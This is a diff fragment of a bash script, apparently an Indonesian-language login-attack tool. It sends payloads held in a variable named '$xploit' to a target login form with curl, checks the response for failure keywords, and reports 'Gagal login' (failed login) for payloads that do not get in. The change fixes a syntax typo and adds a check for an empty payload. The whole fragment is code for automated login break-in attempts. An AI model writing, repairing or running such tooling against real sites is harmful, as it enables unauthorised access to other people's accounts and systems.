@@ -658,11 +658,15 @@ else
 fi
 cek=$(curl -s -L -X POST "${post}" -d "${postdata}")
 if echo "$cek" | grep -Po "User|user|password|Password|Username|username|email|Email|salah|Salah|Gagal|coba|gagal|wrong|Wrong|Invalid|IncorectError|405|error" >/dev/null
- theno
+ then
    echo -e "${R}Gagal login dengan  : ${O}$xploit"
    echo -e "${P}Post data: $post -d "$postdata"${N}\n"
  else
    if [[ "$xploit" = "test" ]];then
+       echo -e "${P}Failed get login${N}"
+       break
+   fi
+   if [[ "$xploit" = "" ]];then
        echo -e "${P}Failed get login${N}"
        break
    fi
